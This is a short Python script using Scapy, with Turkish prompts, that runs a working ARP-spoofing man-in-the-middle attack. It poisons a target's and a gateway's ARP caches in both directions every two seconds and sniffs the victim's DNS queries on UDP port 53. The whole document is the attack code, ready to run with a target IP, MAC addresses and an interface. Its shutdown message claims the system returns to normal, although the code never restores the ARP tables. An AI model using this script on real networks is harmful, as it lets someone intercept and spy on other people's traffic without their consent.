from scapy.all import ARP, Ether, sendp, sniff, DNSQR
import threading
import time
import sys

def process_dns_packet(packet):
    if packet.haslayer(DNSQR):
        query_name = packet[DNSQR].qname.decode()
        print(f"[+] Yakalandı: {query_name}")

def arp_spoof(target_ip, spoof_ip, target_mac, interface):
    arp_paketi = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    ether_frame = Ether(dst=target_mac) / arp_paketi
    
    while True:
        sendp(ether_frame, iface=interface, verbose=False)
        time.sleep(2)

if __name__ == "__main__":
    try:
        t_ip = input("Hedef IP: ")
        g_ip = input("Modem (Gateway) IP: ")
        t_mac = input("Hedef MAC: ")
        g_mac = input("Modem MAC: ") 
        iface = input("Arayüz (wlp0s20f3): ")

        t1 = threading.Thread(target=arp_spoof, args=(t_ip, g_ip, t_mac, iface))
        t2 = threading.Thread(target=arp_spoof, args=(g_ip, t_ip, g_mac, iface))

        t1.daemon = t2.daemon = True
        t1.start()
        t2.start()

        print(f"\n[*] MITM Aktif. {t_ip} trafiği izleniyor...\n")
        sniff(iface=iface, filter="udp port 53", prn=process_dns_packet, store=0)

    except KeyboardInterrupt:
        print("\n[!] Durduruluyor. Sistem normale dönüyor...")
        sys.exit()